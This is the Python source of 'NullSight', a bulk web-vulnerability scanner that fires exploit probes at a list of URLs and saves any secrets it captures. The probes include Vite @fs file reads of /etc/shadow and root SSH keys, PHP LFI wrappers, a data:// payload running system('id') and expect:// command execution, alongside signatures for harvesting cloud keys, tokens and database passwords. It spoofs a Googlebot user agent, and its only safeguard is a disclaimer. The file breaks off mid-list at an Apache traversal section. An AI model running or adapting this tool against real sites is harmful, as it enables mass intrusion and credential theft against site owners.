#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                   ║
║               ███╗   ██╗██╗   ██╗██╗     ██╗     ███████╗██╗ ██████╗ ██╗  ██╗████████╗            ║
║               ████╗  ██║██║   ██║██║     ██║     ██╔════╝██║██╔════╝ ██║  ██║╚══██╔══╝            ║
║               ██╔██╗ ██║██║   ██║██║     ██║     ███████╗██║██║  ███╗███████║   ██║               ║
║               ██║╚██╗██║██║   ██║██║     ██║     ╚════██║██║██║   ██║██╔══██║   ██║               ║
║               ██║ ╚████║╚██████╔╝███████╗███████╗███████║██║╚██████╔╝██║  ██║   ██║               ║
║               ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝               ║
║                                                                                                   ║
║  ┌─────────────────────────────────────────────────────────────────────────────────────────────┐  ║
║  │                         AUTHORIZED BULK PENETRATION TESTING SCANNER                         │  ║
║  └─────────────────────────────────────────────────────────────────────────────────────────────┘  ║
║                                                                                                   ║
║  ╔═════════════════════════════════════════════════════════════════════════════════════════════╗  ║
║  ║                                                                                             ║  ║
║  ║   Author: TheDEEP                              Web: www.thedeep.uz                          ║  ║
║  ║   Version: 1.4                                 Date: 2026                                   ║  ║
║  ║                                                                                             ║  ║
║  ║   ═══════════════════════════════════════════════════════════════════════════════════════   ║  ║
║  ║                                    == COVERAGE ==                                           ║  ║
║  ║                                                                                             ║  ║
║  ║   • 40+ new CVE payloads (Vite, Next.js, Laravel, Yii, Rails, Spring, ...)                  ║  ║
║  ║   • ReactToShell / NginxToShell / SSI Injection probes                                      ║  ║
║  ║   • Misconfiguration engine — Yii debug, Laravel debug, Django DEBUG                        ║  ║
║  ║   • Supply chain: package.json, composer.json, requirements.txt deep check                  ║  ║
║  ║   • SSRF probes (cloud metadata: AWS/GCP/Azure/Ali/DO/Hetzner)                              ║  ║
║  ║   • GraphQL introspection abuse                                                             ║  ║
║  ║   • JWT weak secret / alg:none detection                                                    ║  ║
║  ║   • Redis / Memcached / MongoDB unauthenticated probes                                      ║  ║
║  ║   • Prototype pollution via JSON body probes                                                ║  ║
║  ║   • LFI chaining: wrappers php://filter, expect://, data://                                 ║  ║
║  ║   • Improved FP filter: entropy-based, status-code aware, redirect-aware                    ║  ║
║  ║   • Smart severity escalation based on content intersection                                 ║  ║
║  ║                                                                                             ║  ║
║  ╚═════════════════════════════════════════════════════════════════════════════════════════════╝  ║
║                                                                                                   ║
╚═══════════════════════════════════════════════════════════════════════════════════════════════════╝
"""

# ─────────────────────────────────────────────────────────────────────────────
# STANDARD IMPORTS
# ─────────────────────────────────────────────────────────────────────────────
import asyncio
import aiohttp
import json
import csv
import time
import random
import re
import sys
import math
import logging
import hashlib
from datetime import datetime
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Optional
from urllib.parse import urljoin, urlparse, quote
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import (Progress, SpinnerColumn, BarColumn,
                           TextColumn, TimeElapsedColumn)
from rich import box
logging.getLogger("asyncio").setLevel(logging.CRITICAL)


DISCLAIMER = """
[bold yellow]⚠  DISCLAIMER ⚠[/bold yellow]

This tool is [bold red]ONLY[/bold red] for authorized penetration testing.
• Only use on systems you own or have explicit written permission to test.
• Unauthorized use violates Uzbekistan and international law.

[bold cyan]Type YES to continue:[/bold cyan]
"""

# ─────────────────────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class Config:
    concurrency:     int   = 120
    timeout:         int   = 22
    connect_timeout: int   = 10
    read_timeout:    int   = 16
    max_body_bytes:  int   = 65536   # 64 KB
    max_retries:     int   = 2
    queue_maxsize:   int   = 5000
    output_dir:      str   = "NullSight_findings"
    url_file:        str   = "url.txt"
    delay_min:       float = 0.0
    delay_max:       float = 0.05
    user_agents: list = field(default_factory=lambda: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 "
            "(KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Windows NT 10.0; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/124.0.0.0",
        "python-requests/2.31.0",
        "curl/8.7.1",
    ])

CONFIG = Config()

# ─────────────────────────────────────────────────────────────────────────────
# EXTENSION / CONTENT-TYPE HELPERS
# ─────────────────────────────────────────────────────────────────────────────
JSON_CT  = re.compile(r'application/json|text/json', re.I)
HTML_CT  = re.compile(r'text/html',  re.I)
TEXT_CT  = re.compile(r'^text/',     re.I)
BIN_EXT  = re.compile(
    r'\.(zip|tar\.gz|tar|gz|sql|sqlite3|bak|swp|save|jar|war|hprof|db|dump|7z|rar)$', re.I)

TEXT_BASENAMES = {
    ".env", ".env.backup", ".env.local", ".env.production", ".env.dev",
    ".env.staging", ".env.example", ".env.test", ".env.old", ".htaccess",
    ".htpasswd", "passwd", "shadow", "environ", "cmdline", "version",
    "HEAD", "config", "COMMIT_EDITMSG", "authorized_keys", "id_rsa",
    "id_rsa.pub", "credentials", "Dockerfile", "Gemfile", "requirements.txt",
    "MANIFEST.MF", ".npmrc", ".yarnrc", ".netrc", ".bashrc", ".bash_history",
}

def save_extension(path: str, ct: str, body: bytes) -> str:
    if BIN_EXT.search(path):
        m = re.search(r'(\.[a-z0-9]+)$', path, re.I)
        return m.group(1) if m else ".bin"
    if JSON_CT.search(ct):
        return ".json"
    if HTML_CT.search(ct):
        return ".html"
    if TEXT_CT.search(ct):
        return ".txt"
    basename = path.rstrip("/").split("/")[-1].lower()
    for ext in TEXT_BASENAMES:
        if basename == ext or basename.endswith(ext):
            return ".txt"
    stripped = body[:60].strip()
    if stripped.startswith(b"{") or stripped.startswith(b"["):
        return ".json"
    return ".txt"

# ─────────────────────────────────────────────────────────────────────────────
# ENTROPY (Shannon) — high entropy → potential secret
# ─────────────────────────────────────────────────────────────────────────────
def shannon_entropy(s: str) -> float:
    if not s:
        return 0.0
    freq = {}
    for c in s:
        freq[c] = freq.get(c, 0) + 1
    length = len(s)
    return -sum((v / length) * math.log2(v / length) for v in freq.values())

def has_high_entropy_secret(text: str, threshold: float = 4.5) -> bool:
    """Detects base64/hex secrets: AWS keys, JWT secrets, API tokens."""
    for token in re.findall(r'[A-Za-z0-9+/=_\-]{20,}', text):
        if shannon_entropy(token) >= threshold:
            return True
    return False

# ─────────────────────────────────────────────────────────────────────────────
# SIGNATURES — 50+ signatures, CRITICAL/HIGH focus
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class Signature:
    name:               str
    severity:           str
    pattern:            re.Pattern
    min_content_length: int  = 20
    description:        str  = ""
    is_bytes:           bool = False
    cve:                str  = ""
    tags:               list = field(default_factory=list)

SIGNATURES: list[Signature] = [

    # ════════════════════════════════════════════════════════════
    # ENV / CREDENTIALS
    # ════════════════════════════════════════════════════════════
    Signature("env file with credentials", "CRITICAL",
        re.compile(
            r'(?:APP_KEY|APP_SECRET|DB_PASSWORD|DB_PASS|DATABASE_PASSWORD|'
            r'SECRET_KEY|SECRET|AWS_SECRET|AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|'
            r'API_KEY|API_SECRET|TOKEN|ACCESS_TOKEN|AUTH_TOKEN|JWT_SECRET|'
            r'MAIL_PASSWORD|REDIS_PASSWORD|STRIPE_SECRET|TWILIO_AUTH_TOKEN|'
            r'GITHUB_TOKEN|GOOGLE_API_KEY|PRIVATE_KEY|MYSQL_PASSWORD|'
            r'MYSQL_ROOT_PASSWORD|POSTGRES_PASSWORD|MONGODB_URI|DATABASE_URL|'
            r'PUSHER_APP_SECRET|MIX_PUSHER_APP_KEY|VITE_APP_KEY|'
            r'ENCRYPTION_KEY|HASH_SECRET|PASSWORD_SALT)\s*=\s*\S+',
            re.I | re.M),
        50,
        description="Credential KEY=VALUE found in env file",
        tags=["env", "secret"]),

    Signature("Generic env file", "HIGH",
        re.compile(r'^[A-Za-z_][A-Za-z0-9_]{2,39}=.{1,300}$', re.M),
        60,
        description="Generic environment variable block",
        tags=["env"]),

    Signature("High-entropy secret value", "HIGH",
        re.compile(r'(?:key|secret|token|password|api_key)\s*[=:]\s*["\']?([A-Za-z0-9+/=_\-]{32,})',
                   re.I | re.M),
        30,
        description="High-entropy secret found in response",
        tags=["secret", "entropy"]),

    # ════════════════════════════════════════════════════════════
    # GIT
    # ════════════════════════════════════════════════════════════
    Signature(".git/config exposed", "CRITICAL",
        re.compile(r'\[core\].*repositoryformatversion', re.S | re.I),
        description="Exposed Git repository config",
        tags=["git", "source-code"]),

    Signature(".git/HEAD exposed", "HIGH",
        re.compile(r'^ref:\s+refs/heads/', re.M),
        description="Git HEAD reference exposed",
        tags=["git"]),

    # ════════════════════════════════════════════════════════════
    # LINUX SYSTEM FILES
    # ════════════════════════════════════════════════════════════
    Signature("/etc/passwd exposed", "CRITICAL",
        re.compile(r'root:x:0:0:|nobody:x:\d+:\d+:|www-data:x:\d+', re.M),
        description="Linux passwd file exposed — LFI confirmed",
        tags=["lfi", "system"]),

    Signature("/etc/shadow exposed", "CRITICAL",
        re.compile(r'root:\$[0-9a-z$]\$|:\$y\$|:\$6\$|:\$2b\$', re.M | re.I),
        description="Linux shadow file — password hashes exposed",
        tags=["lfi", "system"]),

    Signature("/etc/hosts exposed", "MEDIUM",
        re.compile(r'127\.0\.0\.1\s+localhost', re.M),
        description="/etc/hosts file exposed",
        tags=["lfi", "system"]),

    Signature("proc/self/environ LFI", "CRITICAL",
        re.compile(r'PATH=(?:/[^:]+:)+|HOME=/(?:root|home|var|www)|SHELL=', re.M),
        40,
        description="Process environment leaked — LFI confirmed",
        tags=["lfi", "rce"]),

    Signature("/proc/self/cmdline", "HIGH",
        re.compile(r'(?:python|php|node|java|ruby|nginx|apache)\x00', re.M),
        description="Process cmdline exposed",
        tags=["lfi"]),

    # ════════════════════════════════════════════════════════════
    # SSH / KEYS
    # ════════════════════════════════════════════════════════════
    Signature("SSH private key", "CRITICAL",
        re.compile(r'-----BEGIN (?:RSA|EC|OPENSSH|DSA|PGP) PRIVATE KEY-----'),
        description="SSH/PGP private key material exposed",
        tags=["ssh", "key"]),

    Signature("AWS credentials", "CRITICAL",
        re.compile(
            r'(?:AKIA|ASIA|AROA|AIDA)[A-Z0-9]{16}|'
            r'aws_secret_access_key\s*=\s*[A-Za-z0-9/+=]{40}', re.I),
        description="AWS access key or secret exposed",
        tags=["cloud", "aws"]),

    Signature("GCP service account key", "CRITICAL",
        re.compile(r'"type"\s*:\s*"service_account".*?"private_key"', re.S | re.I),
        description="Google Cloud service account JSON exposed",
        tags=["cloud", "gcp"]),

    Signature("Service API token", "HIGH",
        re.compile(
            r'(?:ghp_|gho_|ghs_|ghr_)[A-Za-z0-9]{36}|'
            r'xox[bpars]-[0-9A-Za-z\-]{10,}|'
            r'sk-[A-Za-z0-9]{40,}|'
            r'AAAA[A-Za-z0-9_\-]{50,}'),
        description="Service-specific API token pattern",
        tags=["token"]),

    Signature("Database connection DSN", "HIGH",
        re.compile(
            r'(?:mysql|postgres|postgresql|mongodb(?:\+srv)?|mssql|redis|'
            r'amqp|jdbc:mysql|jdbc:postgresql)://[^:\s]+:[^@\s]+@[^/\s]+',
            re.I),
        description="Database DSN with embedded credentials",
        tags=["database", "secret"]),

    # ════════════════════════════════════════════════════════════
    # PHP / WEB FRAMEWORKS
    # ════════════════════════════════════════════════════════════
    Signature("PHP error / stack trace", "MEDIUM",
        re.compile(
            r'(?:Fatal error|Parse error|Warning|Notice):\s+.+?\s+in\s+/.+?\.php|'
            r'Stack trace:|#\d+\s+/.+?\.php\(\d+\)',
            re.I),
        description="PHP error messages exposing internal paths",
        tags=["php", "debug"]),

    Signature("PHP LFI wrappers — base64 leak", "CRITICAL",
        re.compile(r'^[A-Za-z0-9+/]{100,}={0,2}$', re.M),
        100,
        description="php://filter base64 leak — LFI confirmed",
        tags=["lfi", "php"]),

    Signature("Laravel .env / APP_KEY", "CRITICAL",
        re.compile(r'APP_KEY=base64:[A-Za-z0-9+/=]{40,}', re.M),
        description="Laravel APP_KEY exposed — decryption possible",
        cve="CVE-2021-3129",
        tags=["laravel", "secret"]),

    Signature("Laravel debug mode ON", "CRITICAL",
        re.compile(
            r'APP_DEBUG\s*=\s*true|'
            r'Illuminate\\[A-Za-z]+\\[A-Za-z]+Exception|'
            r'laravel\.log|'
            r'"environment"\s*:\s*"(?:local|development)"',
            re.I),
        description="Laravel debug mode enabled — stack traces leaking",
        cve="CVE-2021-3129",
        tags=["laravel", "debug", "missconfig"]),

    Signature("Yii debug mode / Yii2 panel", "CRITICAL",
        re.compile(
            r'yii\s+Debug\s+Toolbar|'
            r'Yii\s+Application\s+Error|'
            r'yii\\base\\[A-Za-z]+Exception|'
            r'"YII_DEBUG"\s*=\s*true|'
            r'Yii2\s+Debug\s+Panel|'
            r'/web/assets/[a-f0-9]+/yii\.js',
            re.I),
        description="Yii/Yii2 debug mode active — CRITICAL misconfiguration",
        tags=["yii", "debug", "missconfig"]),

    Signature("Django DEBUG=True / settings leak", "CRITICAL",
        re.compile(
            r'DEBUG\s*=\s*True|'
            r'DATABASES\s*=\s*\{|'
            r"You're seeing this error because you have DEBUG = True|"
            r'Django\s+Version:|'
            r'SECRET_KEY\s*=\s*[\'"][^\'"]{20,}[\'"]',
            re.I | re.M),
        description="Django DEBUG mode active — SECRET_KEY may be exposed",
        tags=["django", "debug", "missconfig"]),

    Signature("Ruby on Rails debug / stack", "HIGH",
        re.compile(
            r'ActionController::RoutingError|'
            r'Rails\.root|'
            r'config\.secret_key_base|'
            r'Application Trace|Framework Trace',
            re.I),
        description="Rails debug information exposed",
        tags=["rails", "debug", "missconfig"]),

    Signature("Node.js / Express stack trace", "HIGH",
        re.compile(
            r'Error:\s+ENOENT|'
            r'at\s+[A-Za-z]+\s+\((?:/app|/home|/var/www).+?:\d+:\d+\)|'
            r'UnhandledPromiseRejection',
            re.I),
        description="Node.js internal stack trace exposed",
        tags=["nodejs", "debug"]),

    Signature("phpinfo() output", "HIGH",
        re.compile(
            r'PHP Version\s*(?:</td>|</b>|\s)\s*\d\.\d|'
            r'phpinfo\(\)|'
            r'<td class="e">disable_functions',
            re.I),
        description="phpinfo() output — server internals exposed",
        tags=["php", "missconfig"]),

    # ════════════════════════════════════════════════════════════
    # SPRING BOOT / JAVA
    # ════════════════════════════════════════════════════════════
    Signature("Spring Boot actuator env", "CRITICAL",
        re.compile(
            r'"activeProfiles"|"configMaps"|"propertySources"|'
            r'"spring\.datasource\.password"|"spring\.mail\.password"',
            re.I),
        description="Spring Boot actuator /env endpoint exposed",
        tags=["spring", "actuator"]),

    Signature("Spring Boot actuator beans/mappings", "HIGH",
        re.compile(r'"beans":\[|"mappings":\{|"dispatcherServlets"', re.I),
        description="Spring Boot actuator endpoint exposed",
        tags=["spring", "actuator"]),

    Signature("Spring Boot heapdump (bytes)", "CRITICAL",
        re.compile(rb'JAVA PROFILE \d\.\d|HPROF|java\.lang\.Object', re.I),
        50,
        description="Spring Boot heap dump — memory dump exposed",
        is_bytes=True,
        tags=["spring", "java"]),

    Signature("Spring Boot ..;/ bypass", "HIGH",
        re.compile(r'"status"\s*:\s*200|"principal"|"authorities"', re.I),
        description="Spring Security bypass via ..;/ — potential auth bypass",
        cve="CVE-2023-34035",
        tags=["spring", "bypass"]),

    # ════════════════════════════════════════════════════════════
    # NGINX / APACHE MISCONFIG
    # ════════════════════════════════════════════════════════════
    Signature("Nginx status page", "MEDIUM",
        re.compile(r'Active connections:\s+\d+|server accepts handled requests|Reading:\s+\d+', re.I),
        description="Nginx stub_status page exposed",
        tags=["nginx", "missconfig"]),

    Signature("Apache server-status", "MEDIUM",
        re.compile(
            r'Apache Server Status|CurrentTime|ServerUptime|'
            r'Busy Workers|Idle Workers|CPU Load',
            re.I),
        description="Apache mod_status page exposed",
        tags=["apache", "missconfig"]),

    Signature("Nginx off-by-slash LFI", "HIGH",
        re.compile(r'root:x:0:0:|/etc/passwd|/etc/shadow', re.I),
        description="Nginx alias off-by-slash — directory traversal confirmed",
        tags=["nginx", "lfi", "missconfig"]),

    Signature("Directory listing enabled", "MEDIUM",
        re.compile(r'Index of /|Parent Directory|<title>Directory listing', re.I),
        description="Web server directory listing enabled",
        tags=["missconfig"]),

    # ════════════════════════════════════════════════════════════
    # SSRF — CLOUD METADATA
    # ════════════════════════════════════════════════════════════
    Signature("AWS metadata SSRF confirmed", "CRITICAL",
        re.compile(
            r'"Code"\s*:\s*"Success"|'
            r'"AccessKeyId"\s*:|'
            r'ami-[a-f0-9]{8,17}|'
            r'"instanceId"\s*:\s*"i-',
            re.I),
        description="AWS IMDSv1 metadata retrieved — SSRF confirmed",
        tags=["ssrf", "cloud", "aws"]),

    Signature("GCP metadata SSRF confirmed", "CRITICAL",
        re.compile(
            r'"computeMetadata"|'
            r'"serviceAccounts":|'
            r'metadata\.google\.internal',
            re.I),
        description="GCP metadata server response — SSRF confirmed",
        tags=["ssrf", "cloud", "gcp"]),

    Signature("Azure metadata SSRF confirmed", "CRITICAL",
        re.compile(r'"subscriptionId":|"resourceGroupName":|"azEnvironment":', re.I),
        description="Azure IMDS response — SSRF confirmed",
        tags=["ssrf", "cloud", "azure"]),

    # ════════════════════════════════════════════════════════════
    # GraphQL
    # ════════════════════════════════════════════════════════════
    Signature("GraphQL introspection exposed", "HIGH",
        re.compile(
            r'"__schema"\s*:\s*\{|'
            r'"queryType"\s*:\s*\{|'
            r'"types"\s*:\s*\[.*?"kind"',
            re.S | re.I),
        description="GraphQL introspection enabled — schema dump possible",
        tags=["graphql", "missconfig"]),

    Signature("GraphQL error / stack trace", "MEDIUM",
        re.compile(r'"errors"\s*:\s*\[.*?"message".*?"locations"', re.S | re.I),
        description="GraphQL error with stack trace",
        tags=["graphql"]),

    # ════════════════════════════════════════════════════════════
    # JWT
    # ════════════════════════════════════════════════════════════
    Signature("JWT alg:none / weak secret", "CRITICAL",
        re.compile(
            r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.(|[A-Za-z0-9_\-]+)|'
            r'"alg"\s*:\s*"none"',
            re.I),
        description="JWT token exposed or alg:none accepted",
        tags=["jwt", "auth"]),

    # ════════════════════════════════════════════════════════════
    # WINDOWS / IIS
    # ════════════════════════════════════════════════════════════
    Signature("Windows win.ini / boot.ini", "HIGH",
        re.compile(r'\[fonts\]|\[extensions\]|\[boot loader\]|multi\(0\)', re.I),
        description="Windows configuration file exposed",
        tags=["windows", "lfi"]),

    Signature("IIS detailed error", "MEDIUM",
        re.compile(
            r'Microsoft-IIS/|'
            r'HTTP Error \d{3}\.\d+|'
            r'ASP\.NET is configured to show verbose error messages',
            re.I),
        description="IIS detailed error page — version disclosure",
        tags=["iis", "debug"]),

    # ════════════════════════════════════════════════════════════
    # CI/CD — Jenkins, TeamCity, GitLab
    # ════════════════════════════════════════════════════════════
    Signature("Jenkins credentials.xml", "CRITICAL",
        re.compile(r'<com\.cloudbees\.plugins\.credentials|<hudson\.util\.Secret>', re.I),
        description="Jenkins credentials.xml exposed",
        tags=["jenkins", "cicd"]),

    Signature("TeamCity API exposed", "HIGH",
        re.compile(r'"buildTypeId"|"projectId"|"TeamCity"|"agentId"', re.I),
        description="JetBrains TeamCity REST API exposed",
        cve="CVE-2024-27198",
        tags=["teamcity", "cicd"]),

    Signature("GitLab CI variables", "CRITICAL",
        re.compile(
            r'CI_JOB_TOKEN|CI_REGISTRY_PASSWORD|GITLAB_TOKEN|'
            r'"variable_type"\s*:\s*"env_var"',
            re.I),
        description="GitLab CI environment variable exposed",
        tags=["gitlab", "cicd", "secret"]),

    # ════════════════════════════════════════════════════════════
    # CONTAINER / K8s
    # ════════════════════════════════════════════════════════════
    Signature("Docker / k8s secrets", "CRITICAL",
        re.compile(
            r'POSTGRES_PASSWORD:|MYSQL_ROOT_PASSWORD:|MONGO_INITDB_ROOT_PASSWORD:|'
            r'RABBITMQ_DEFAULT_PASS:|kind:\s*Secret|"apiVersion"\s*:\s*"v1"',
            re.I),
        description="Container/Kubernetes secrets exposed",
        tags=["docker", "k8s", "secret"]),

    Signature("Kubernetes dashboard / API", "CRITICAL",
        re.compile(
            r'"namespaces"|"pods":\[|"deployments":\[|'
            r'"serviceAccountName"|Bearer\s+[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+',
            re.I),
        description="Kubernetes API or dashboard exposed",
        tags=["k8s", "missconfig"]),

    # ════════════════════════════════════════════════════════════
    # WORDPRESS / CMS
    # ════════════════════════════════════════════════════════════
    Signature("WordPress wp-config.php", "CRITICAL",
        re.compile(
            r"define\s*\(\s*'DB_PASSWORD'\s*,\s*'[^']+'\s*\)|"
            r"define\s*\(\s*'AUTH_KEY'\s*,\s*'[^']+'\s*\)",
            re.I),
        description="WordPress wp-config.php source exposed",
        tags=["wordpress", "secret"]),

    Signature("WordPress XML-RPC enabled", "MEDIUM",
        re.compile(r'<?xml version|<methodResponse>|<fault>', re.I),
        description="WordPress XML-RPC enabled — brute force risk",
        tags=["wordpress", "missconfig"]),

    # ════════════════════════════════════════════════════════════
    # SUPPLY CHAIN
    # ════════════════════════════════════════════════════════════
    Signature("package.json with scripts/deps", "MEDIUM",
        re.compile(
            r'"dependencies"\s*:\s*\{|"devDependencies"\s*:\s*\{|'
            r'"scripts"\s*:\s*\{',
            re.I),
        description="package.json exposed — dependency enumeration possible",
        tags=["supply-chain", "nodejs"]),

    Signature("composer.json with deps", "MEDIUM",
        re.compile(r'"require"\s*:\s*\{|"require-dev"\s*:\s*\{', re.I),
        description="composer.json exposed — PHP supply chain enumeration",
        tags=["supply-chain", "php"]),

    Signature("requirements.txt exposed", "LOW",
        re.compile(r'^[a-zA-Z][a-zA-Z0-9\-_]+(?:==|>=|<=|~=|!=)\d', re.M),
        description="requirements.txt exposed — Python supply chain enumeration",
        tags=["supply-chain", "python"]),

    Signature(".npmrc with authToken", "CRITICAL",
        re.compile(r'//registry\.npmjs\.org/:_authToken|_auth\s*=\s*[A-Za-z0-9+/=]{20,}', re.I),
        description=".npmrc with NPM token exposed",
        tags=["supply-chain", "secret"]),

    # ════════════════════════════════════════════════════════════
    # Confluence / Atlassian
    # ════════════════════════════════════════════════════════════
    Signature("Confluence OGNL / admin", "CRITICAL",
        re.compile(r'com\.atlassian\.confluence|Confluence.*Administration|OGNL', re.I),
        description="Atlassian Confluence admin or OGNL injection",
        cve="CVE-2022-26134",
        tags=["confluence", "rce"]),

    # ════════════════════════════════════════════════════════════
    # HTACCESS / SERVER CONFIG
    # ════════════════════════════════════════════════════════════
    Signature(".htaccess exposed", "MEDIUM",
        re.compile(
            r'RewriteEngine|RewriteRule|RewriteCond|Deny from all|'
            r'Allow from|AuthUserFile|<Files|<Directory',
            re.I | re.M),
        20,
        description=".htaccess configuration exposed",
        tags=["apache", "missconfig"]),

    # ════════════════════════════════════════════════════════════
    # REDIS / MEMCACHED (response-based)
    # ════════════════════════════════════════════════════════════
    Signature("Redis HTTP interface exposed", "CRITICAL",
        re.compile(r'-ERR unknown command|^\+OK$|\$\d+\r\n', re.M),
        description="Redis HTTP interface or raw response detected",
        tags=["redis", "missconfig"]),

    # ════════════════════════════════════════════════════════════
    # PROTOTYPE POLLUTION / JSON INJECTION
    # ════════════════════════════════════════════════════════════
    Signature("Prototype pollution reflected", "HIGH",
        re.compile(r'"__proto__"\s*:\s*\{|"constructor"\s*:\s*\{.*?"prototype"', re.S | re.I),
        description="Prototype pollution payload reflected in response",
        tags=["prototype-pollution", "javascript"]),

    # ════════════════════════════════════════════════════════════
    # MISC
    # ════════════════════════════════════════════════════════════
    Signature("Backup PHP source (swap/bak)", "HIGH",
        re.compile(r'<\?php\s|<\?=\s', re.M),
        description="Raw PHP source code in response (swap/backup file)",
        tags=["php", "source-code"]),

    Signature("Kibana / Elasticsearch", "HIGH",
        re.compile(
            r'"cluster_name"\s*:|"cluster_uuid"\s*:|"kibana.version"\s*:|'
            r'"number_of_nodes"\s*:\s*\d',
            re.I),
        description="Kibana/Elasticsearch exposed — data exfiltration risk",
        tags=["elasticsearch", "missconfig"]),

    Signature("Grafana datasource credentials", "CRITICAL",
        re.compile(r'"secureJsonData"\s*:\s*\{|"password"\s*:\s*"[^"]{8,}"', re.I),
        description="Grafana datasource with credentials exposed",
        tags=["grafana", "secret"]),

    Signature("SSI injection response", "HIGH",
        re.compile(r'uid=\d+\([a-z]+\)\s+gid=\d+|total\s+\d+\ndrwx', re.I),
        description="SSI injection — command output in response",
        tags=["ssi", "rce"]),

    Signature("RCE command output", "CRITICAL",
        re.compile(
            r'uid=0\(root\)|uid=\d+\(\w+\)\s+gid=\d+|'
            r'Linux\s+\S+\s+\d+\.\d+\.\d+.*?#\d+\s+SMP|'
            r'Microsoft Windows \[Version \d+\.\d+',
            re.I),
        description="Remote Code Execution — command output confirmed",
        tags=["rce"]),
]

# ─────────────────────────────────────────────────────────────────────────────
# PROBE PATHS — 120+ paths
# Each entry: (path, label, method, body, extra_headers)
# method  = "GET" | "POST"
# body    = None | dict (will be JSON-encoded)
# extra_headers = None | dict
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class Probe:
    path:          str
    label:         str
    method:        str  = "GET"
    body:          Optional[dict] = None
    extra_headers: Optional[dict] = None
    cve:           str  = ""

PROBES: list[Probe] = [

    # ══════════════════════════════════════════════════════════════
    # .ENV VARIANTS
    # ══════════════════════════════════════════════════════════════
    Probe("/.env",                      ".env"),
    Probe("/.env.backup",               ".env.backup"),
    Probe("/.env.local",                ".env.local"),
    Probe("/.env.production",           ".env.production"),
    Probe("/.env.dev",                  ".env.dev"),
    Probe("/.env.staging",              ".env.staging"),
    Probe("/.env.example",              ".env.example"),
    Probe("/.env.test",                 ".env.test"),
    Probe("/.env.old",                  ".env.old"),
    Probe("/.env.bak",                  ".env.bak"),
    Probe("/.env.save",                 ".env.save"),
    Probe("/env",                       "env"),
    Probe("/.env~",                     ".env~"),
    Probe("/.env.2024",                 ".env.2024"),
    Probe("/.env.2023",                 ".env.2023"),

    # ══════════════════════════════════════════════════════════════
    # GIT REPOSITORY
    # ══════════════════════════════════════════════════════════════
    Probe("/.git/config",               ".git/config"),
    Probe("/.git/HEAD",                 ".git/HEAD"),
    Probe("/.git/COMMIT_EDITMSG",       ".git/COMMIT_EDITMSG"),
    Probe("/.git/logs/HEAD",            ".git/logs/HEAD"),
    Probe("/.git/index",                ".git/index"),
    Probe("/.git/refs/heads/main",      ".git/refs/main"),
    Probe("/.git/refs/heads/master",    ".git/refs/master"),

    # ══════════════════════════════════════════════════════════════
    # CVE-2025-30208 / CVE-2024-23331 — Vite @fs bypass
    # ══════════════════════════════════════════════════════════════
    Probe("/@fs/etc/passwd",                        "Vite @fs passwd",            cve="CVE-2024-23331"),
    Probe("/@fs/etc/passwd?raw",                    "Vite @fs passwd raw",        cve="CVE-2024-23331"),
    Probe("/@fs/etc/passwd?import&raw",             "Vite @fs passwd import+raw", cve="CVE-2024-23331"),
    Probe("/@fs/proc/self/environ",                 "Vite @fs environ",           cve="CVE-2024-23331"),
    Probe("/@fs/proc/self/environ?raw",             "Vite @fs environ raw",       cve="CVE-2024-23331"),
    Probe("/@fs/app/.env",                          "Vite @fs app .env",          cve="CVE-2024-23331"),
    Probe("/@fs/app/.env?raw",                      "Vite @fs app .env raw",      cve="CVE-2024-23331"),
    Probe("/@fs/var/www/html/.env",                 "Vite @fs www .env",          cve="CVE-2024-23331"),
    Probe("/@fs/home/node/app/.env",                "Vite @fs node .env",         cve="CVE-2024-23331"),
    Probe("/@fs/etc/passwd?raw??",                  "Vite ?raw?? bypass",         cve="CVE-2025-30208"),
    Probe("/@fs/proc/self/environ?raw??",           "Vite environ ?raw??",        cve="CVE-2025-30208"),
    Probe("/@fs/app/.env?raw??",                    "Vite .env ?raw??",           cve="CVE-2025-30208"),
    Probe("/@fs/etc/shadow?raw??",                  "Vite shadow ?raw??",         cve="CVE-2025-30208"),
    Probe("/@fs/etc/ssh/ssh_host_rsa_key?raw",      "Vite SSH host key",          cve="CVE-2024-23331"),
    Probe("/@fs/root/.ssh/id_rsa?raw",              "Vite root id_rsa",           cve="CVE-2024-23331"),

    # ══════════════════════════════════════════════════════════════
    # PHP LFI WRAPPERS (CVE-agnostic)
    # ══════════════════════════════════════════════════════════════
    Probe("/?page=php://filter/convert.base64-encode/resource=index",
          "LFI php://filter index",),
    Probe("/?file=php://filter/convert.base64-encode/resource=/etc/passwd",
          "LFI php://filter passwd"),
    Probe("/?page=php://filter/convert.base64-encode/resource=../config",
          "LFI php://filter config"),
    Probe("/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+",
          "LFI data:// RCE probe"),
    Probe("/?file=expect://id",
          "LFI expect:// RCE probe"),
    Probe("/?page=../../../../etc/passwd",
          "Classic LFI ../../../../etc/passwd"),
    Probe("/?file=....//....//....//etc/passwd",
          "LFI four-dot bypass"),
    Probe("/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
          "LFI URL-encoded"),
    Probe("/?page=..%252f..%252f..%252fetc%252fpasswd",
          "LFI double URL-encoded"),

    # ══════════════════════════════════════════════════════════════
    # CVE-2021-41773 / CVE-2021-42013 — Apache path traversal
    # ══════════════════════════════════════════════════════════════
